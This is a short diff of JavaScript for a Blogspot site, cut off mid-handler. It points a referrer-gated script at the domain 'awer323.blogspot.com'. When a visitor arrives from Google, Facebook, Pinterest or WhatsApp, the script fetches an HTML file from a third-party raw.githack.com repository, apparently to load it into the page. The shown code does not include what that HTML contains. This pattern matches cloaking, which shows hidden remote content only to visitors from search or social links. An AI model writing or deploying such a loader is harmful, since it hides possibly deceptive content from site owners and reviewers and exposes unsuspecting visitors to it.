@@ -4,7 +4,7 @@ const currentDomain = window.location.hostname.toLowerCase();
 const allowedReferrers = ['google', 'facebook', 'pinterest', 'whatsapp.com'];
 const articleContent = '';
 
-if (allowedReferrers.some(referrer.includes.bind(referrer)) && currentDomain === 'roneeyi.com') {
+if (allowedReferrers.some(referrer.includes.bind(referrer)) && currentDomain === 'awer323.blogspot.com') {
   fetch('https://raw.githack.com/mrotang/cloudflare/assets/raja.html')
     .then(response => response.text())
     .then(html => {
